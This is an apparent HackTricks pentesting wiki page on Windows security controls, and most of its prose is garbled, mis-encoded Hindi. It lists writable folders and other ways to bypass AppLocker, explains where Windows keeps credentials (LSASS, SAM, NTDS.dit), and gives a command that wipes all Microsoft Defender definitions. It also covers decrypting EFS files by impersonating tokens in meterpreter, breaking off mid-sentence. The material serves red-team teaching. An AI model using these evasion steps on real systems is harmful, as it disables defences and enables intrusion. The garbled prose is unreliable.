# Windows Security Controls

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker Policy

рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ рдПрдХ рд╕реВрдЪреА рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЕрдиреБрдореЛрджрд┐рдд рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдпрд╛ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдлрд╝рд╛рдЗрд▓реЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреА рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдХрд┐рд╕реА рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдЙрдкрд╕реНрдерд┐рдд рдФрд░ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред рдЗрд╕рдХрд╛ рд▓рдХреНрд╖реНрдп рдкрд░реНрдпрд╛рд╡рд░рдг рдХреЛ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдореИрд▓рд╡реЗрдпрд░ рдФрд░ рдЕрдкреНрд░реВрд╡реНрдб рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рд╕реЗ рдмрдЪрд╛рдирд╛ рд╣реИ рдЬреЛ рдХрд┐рд╕реА рд╕рдВрдЧрдарди рдХреА рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╡реНрдпрд╛рд╡рд╕рд╛рдпрд┐рдХ рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддрд╛ред

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдХрд╛ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯрд┐рдВрдЧ рд╕рдорд╛рдзрд╛рди** рд╣реИ рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЛ **рдпрд╣ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреМрди рд╕реА рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдФрд░ рдлрд╝рд╛рдЗрд▓реЗрдВ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред рдпрд╣ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдлрд╝рд╛рдЗрд▓реЛрдВ, рд╕реНрдХреНрд░рд┐рдкреНрдЯреЛрдВ, рд╡рд┐рдВрдбреЛрдЬ рдЗрдВрд╕реНрдЯреЙрд▓рд░ рдлрд╝рд╛рдЗрд▓реЛрдВ, DLLs, рдкреИрдХреЗрдЬреНрдб рдРрдкреНрд╕ рдФрд░ рдкреИрдХреНрдб рдРрдк рдЗрдВрд╕реНрдЯреЙрд▓рд░ рдкрд░ **рд╕реВрдХреНрд╖реНрдо рдирд┐рдпрдВрддреНрд░рдг** рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред\
рдпрд╣ рд╕рд╛рдорд╛рдиреНрдп рд╣реИ рдХрд┐ рд╕рдВрдЧрдарди **cmd.exe рдФрд░ PowerShell.exe** рдФрд░ рдХреБрдЫ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдХреЛ **рдмреНрд▓реЙрдХ рдХрд░рддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ рд╕рднреА рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред

### Check

Check which files/extensions are blacklisted/whitelisted:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
рдпрд╣ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдкрде AppLocker рджреНрд╡рд╛рд░рд╛ рд▓рд╛рдЧреВ рдХреА рдЧрдИ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдФрд░ рдиреАрддрд┐рдпреЛрдВ рдХреЛ рд╕рдорд╛рд╣рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд▓рд╛рдЧреВ рд╡рд░реНрддрдорд╛рди рдирд┐рдпрдореЛрдВ рдХреЗ рд╕реЗрдЯ рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ:

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### рдмрд╛рдпрдкрд╛рд╕

* AppLocker рдиреАрддрд┐ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА **рд▓реЗрдЦрди рдпреЛрдЧреНрдп рдлрд╝реЛрд▓реНрдбрд░**: рдпрджрд┐ AppLocker `C:\Windows\System32` рдпрд╛ `C:\Windows` рдХреЗ рдЕрдВрджрд░ рдХреБрдЫ рднреА рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд░рд╣рд╛ рд╣реИ, рддреЛ рдРрд╕реЗ **рд▓реЗрдЦрди рдпреЛрдЧреНрдп рдлрд╝реЛрд▓реНрдбрд░** рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЖрдк **рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* рд╕рд╛рдорд╛рдиреНрдпрддрдГ **рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп** [**"LOLBAS's"**](https://lolbas-project.github.io/) рдмрд╛рдЗрдирд░реАрдЬрд╝ AppLocker рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреА рд╣реИрдВред
* **рдЦрд░рд╛рдм рд▓рд┐рдЦреЗ рдЧрдП рдирд┐рдпрдореЛрдВ рдХреЛ рднреА рдмрд╛рдпрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**
* рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, рдЖрдк рдХрд╣реАрдВ рднреА рдПрдХ **рдлреЛрд▓реНрдбрд░ `allowed`** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рдПрдЧреАред
* рд╕рдВрдЧрдарди рдЕрдХреНрд╕рд░ **`%System32%\WindowsPowerShell\v1.0\powershell.exe`** рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдХреЛ **рдмреНрд▓реЙрдХ рдХрд░рдиреЗ** рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди **рдЕрдиреНрдп** [**PowerShell рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рд╕реНрдерд╛рдиреЛрдВ**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) рдХреЛ рднреВрд▓ рдЬрд╛рддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` рдпрд╛ `PowerShell_ISE.exe`ред
* **DLL рдкреНрд░рд╡рд░реНрддрди рдмрд╣реБрдд рдХрдо рд╕рдХреНрд╖рдо** рд╣реЛрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдЕрддрд┐рд░рд┐рдХреНрдд рд▓реЛрдб рдбрд╛рд▓ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдкрд░реАрдХреНрд╖рдг рдХреА рдорд╛рддреНрд░рд╛ред рдЗрд╕рд▓рд┐рдП **DLLs рдХреЛ рдмреИрдХрдбреЛрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ AppLocker рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░реЗрдЧрд╛**ред
* рдЖрдк [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) рдпрд╛ [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **Powershell** рдХреЛрдб рдХреЛ рдХрд┐рд╕реА рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ AppLocker рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╕реНрдЯреЛрд░реЗрдЬ

### рд╕реБрд░рдХреНрд╖рд╛ рдЦрд╛рддрд╛ рдкреНрд░рдмрдВрдзрдХ (SAM)

рд╕реНрдерд╛рдиреАрдп рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдореМрдЬреВрдж рд╣реИрдВ, рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢ рдХрд┐рдП рдЧрдП рд╣реИрдВред

### рд╕реНрдерд╛рдиреАрдп рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рд╛рдзрд┐рдХрд░рдг (LSA) - LSASS

**рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** (рд╣реИрд╢ рдХрд┐рдП рдЧрдП) рдЗрд╕ рдЙрдкрдкреНрд░рдгрд╛рд▓реА рдХреА **рдореЗрдореЛрд░реА** рдореЗрдВ **рд╕рд╣реЗрдЬреЗ** рдЬрд╛рддреЗ рд╣реИрдВ рдПрдХрд▓ рд╕рд╛рдЗрди-рдСрди рдХрд╛рд░рдгреЛрдВ рдХреЗ рд▓рд┐рдПред\
**LSA** рд╕реНрдерд╛рдиреАрдп **рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐** (рдкрд╛рд╕рд╡рд░реНрдб рдиреАрддрд┐, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреБрдорддрд┐рдпрд╛рдБ...), **рдкреНрд░рдорд╛рдгреАрдХрд░рдг**, **рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди**... рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░рддрд╛ рд╣реИред\
LSA рд╡рд╣ рд╣реЛрдЧрд╛ рдЬреЛ **SAM** рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреА **рдЬрд╛рдВрдЪ** рдХрд░реЗрдЧрд╛ (рд╕реНрдерд╛рдиреАрдп рд▓реЙрдЧрд┐рди рдХреЗ рд▓рд┐рдП) рдФрд░ рдПрдХ рдбреЛрдореЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдбреЛрдореЗрди рдирд┐рдпрдВрддреНрд░рдХ** рд╕реЗ **рдмрд╛рдд рдХрд░реЗрдЧрд╛**ред

**рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** **рдкреНрд░рдХреНрд░рд┐рдпрд╛ LSASS** рдХреЗ рдЕрдВрджрд░ **рд╕рд╣реЗрдЬреЗ** рдЬрд╛рддреЗ рд╣реИрдВ: Kerberos рдЯрд┐рдХрдЯ, NT рдФрд░ LM рд╣реИрд╢, рдЖрд╕рд╛рдиреА рд╕реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдП рдЧрдП рдкрд╛рд╕рд╡рд░реНрдбред

### LSA рд░рд╣рд╕реНрдп

LSA рдХреБрдЫ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдбрд┐рд╕реНрдХ рдореЗрдВ рд╕рд╣реЗрдЬ рд╕рдХрддрд╛ рд╣реИ:

* рд╕рдХреНрд░рд┐рдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддреЗ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб (рдЕрдкреНрд░рд╛рдкреНрдп рдбреЛрдореЗрди рдирд┐рдпрдВрддреНрд░рдХ)ред
* Windows рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рдЦрд╛рддреЛрдВ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб
* рдЕрдиреБрд╕реВрдЪрд┐рдд рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдкрд╛рд╕рд╡рд░реНрдб
* рдЕрдзрд┐рдХ (IIS рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб...)

### NTDS.dit

рдпрд╣ рд╕рдХреНрд░рд┐рдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рд╣реИред рдпрд╣ рдХреЗрд╡рд▓ рдбреЛрдореЗрди рдирд┐рдпрдВрддреНрд░рдХреЛрдВ рдореЗрдВ рдореМрдЬреВрдж рд╣реИред

## рдбрд┐рдлреЗрдВрдбрд░

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) рдПрдХ рдПрдВрдЯреАрд╡рд╛рдпрд░рд╕ рд╣реИ рдЬреЛ Windows 10 рдФрд░ Windows 11 рдореЗрдВ рдЙрдкрд▓рдмреНрдз рд╣реИ, рдФрд░ Windows Server рдХреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВред рдпрд╣ рд╕рд╛рдорд╛рдиреНрдп рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдЙрдкрдХрд░рдгреЛрдВ рдЬреИрд╕реЗ **`WinPEAS`** рдХреЛ **рдмреНрд▓реЙрдХ** рдХрд░рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдЗрди рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреЛ **рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ** рдХреЗ рддрд░реАрдХреЗ рд╣реИрдВред

### рдЬрд╛рдВрдЪ

**рдбрд┐рдлреЗрдВрдбрд░** рдХреА **рд╕реНрдерд┐рддрд┐** рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк PS cmdlet **`Get-MpComputerStatus`** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╣ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдпрд╣ рд╕рдХреНрд░рд┐рдп рд╣реИ рдпрд╛ рдирд╣реАрдВ **`RealTimeProtectionEnabled`** рдХрд╛ рдорд╛рди рдЬрд╛рдВрдЪреЗрдВ):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

рдЗрд╕реЗ рд╕реВрдЪреАрдмрджреНрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдпрд╣ рднреА рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдПрдХ **рд╕рдорд╛рдирд╛рдВрддрд░ рдХреБрдВрдЬреА** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдЬрд┐рд╕реЗ **рдлрд╛рдЗрд▓ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреБрдВрдЬреА (FEK)** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдХреБрдВрдЬреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА **рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА** рдХреЗ рд╕рд╛рде рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХреА рдЬрд╛рддреА рд╣реИ рдФрд░ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдлрд╝рд╛рдЗрд▓ рдХреЗ $EFS **рд╡реИрдХрд▓реНрдкрд┐рдХ рдбреЗрдЯрд╛ рд╕реНрдЯреНрд░реАрдо** рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХреА рдЬрд╛рддреА рд╣реИред рдЬрдм рдбрд┐рдХреНрд░рд┐рдкреНрд╢рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдбрд┐рдЬрд┐рдЯрд▓ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреА рд╕рдВрдмрдВрдзрд┐рдд **рдирд┐рдЬреА рдХреБрдВрдЬреА** рдХрд╛ рдЙрдкрдпреЛрдЧ FEK рдХреЛ $EFS рд╕реНрдЯреНрд░реАрдо рд╕реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [рдпрд╣рд╛рдБ](https://en.wikipedia.org/wiki/Encrypting\_File\_System) рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

**рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкрд╣рд▓ рдХреЗ рдмрд┐рдирд╛ рдбрд┐рдХреНрд░рд┐рдкреНрд╢рди рдкрд░рд┐рджреГрд╢реНрдп** рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

* рдЬрдм рдлрд╝рд╛рдЗрд▓реЗрдВ рдпрд╛ рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ рдЧреИрд░-EFS рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо, рдЬреИрд╕реЗ [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table) рдореЗрдВ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╡реЗ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рд╣реЛ рдЬрд╛рддреЗ рд╣реИрдВред
* SMB/CIFS рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рднреЗрдЬреА рдЧрдИ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдлрд╝рд╛рдЗрд▓реЗрдВ рдкреНрд░рд╕рд╛рд░рдг рд╕реЗ рдкрд╣рд▓реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХреА рдЬрд╛рддреА рд╣реИрдВред

рдпрд╣ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рд╡рд┐рдзрд┐ рдорд╛рд▓рд┐рдХ рдХреЗ рд▓рд┐рдП рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ **рдкрд╛рд░рджрд░реНрд╢реА рдкрд╣реБрдБрдЪ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдХреЗрд╡рд▓ рдорд╛рд▓рд┐рдХ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдмрджрд▓рдиреЗ рдФрд░ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рд╕реЗ рдбрд┐рдХреНрд░рд┐рдкреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рдорд┐рд▓реЗрдЧреАред

**рдореБрдЦреНрдп рдмрд┐рдВрджреБ**:

* EFS рдПрдХ рд╕рдорд╛рдирд╛рдВрддрд░ FEK рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
* рдбрд┐рдХреНрд░рд┐рдкреНрд╢рди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдирд┐рдЬреА рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ FEK рддрдХ рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛ рд╕рдХреЗред
* FAT32 рдореЗрдВ рдХреЙрдкреА рдХрд░рдиреЗ рдпрд╛ рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░рд╛рдВрд╕рдорд┐рд╢рди рдЬреИрд╕реА рд╡рд┐рд╢рд┐рд╖реНрдЯ рдкрд░рд┐рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЗ рддрд╣рдд рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдбрд┐рдХреНрд░рд┐рдкреНрд╢рди рд╣реЛрддрд╛ рд╣реИред
* рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдлрд╝рд╛рдЗрд▓реЗрдВ рдорд╛рд▓рд┐рдХ рдХреЗ рд▓рд┐рдП рдмрд┐рдирд╛ рдЕрддрд┐рд░рд┐рдХреНрдд рдХрджрдореЛрдВ рдХреЗ рд╕реБрд▓рдн рд╣реЛрддреА рд╣реИрдВред

### Check EFS info

рдЬрд╛рдБрдЪ рдХрд░реЗрдВ рдХрд┐ рдХреНрдпрд╛ рдПрдХ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдиреЗ рдЗрд╕ **рд╕реЗрд╡рд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рд╣реИ рдпрд╣ рдЬрд╛рдБрдЪрдХрд░ рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рдкрде рдореМрдЬреВрдж рд╣реИ:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

рдЬрд╛рдБрдЪ рдХрд░реЗрдВ **рдХрд┐рд╕рдХреЗ рдкрд╛рд╕** рдлрд╝рд╛рдЗрд▓ рддрдХ **рдкрд╣реБрдБрдЪ** рд╣реИ `cipher /c \<file>\`\
рдЖрдк `cipher /e` рдФрд░ `cipher /d` рдХрд╛ рдЙрдкрдпреЛрдЧ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдПрдХ рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рдЕрдВрджрд░ рд╕рднреА рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ** рдФрд░ **рдбрд┐рдХреНрд░рд┐рдкреНрдЯ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

### Decrypting EFS files

#### Being Authority System

рдпрд╣ рддрд░реАрдХрд╛ **рдкреАрдбрд╝рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЛ рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдВрджрд░ рдПрдХ **рдкреНрд░рдХреНрд░рд┐рдпрд╛** рдЪрд▓рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдпрджрд┐ рдРрд╕рд╛ рд╣реИ, рддреЛ `meterpreter` рд╕рддреНрд░реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдЖрдк рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЯреЛрдХрди рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (`impersonate_token` рд╕реЗ `incognito`)ред рдпрд╛ рдЖрдк рдмрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ `migrate` рдХрд░ рд╕рдХрддреЗ 